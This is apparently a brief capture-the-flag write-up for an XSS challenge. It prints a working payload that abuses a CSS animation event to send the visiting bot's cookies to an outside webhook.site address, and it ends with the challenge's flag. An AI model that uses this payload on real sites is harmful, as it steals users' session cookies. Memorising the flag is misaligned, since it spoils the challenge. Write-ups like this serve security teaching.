The attacker intuitively understands that the objective is to perform XSS on the report submitted. By playing around with potential inputs and seeing what is allowed, they will find that the following payload works:

<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="window.location='https://webhook.site/c70ace03-220a-41ca-bbb2-2c4bd0bdfccf?c=' + document.cookie;"></xss>

This causes the agent in the site to visit the link, and disclose the flag in the cookie.

flag = "CCSC{1f_1t_acc3pt5_1NpuT_1t_W!LL_b3_XSSed}"
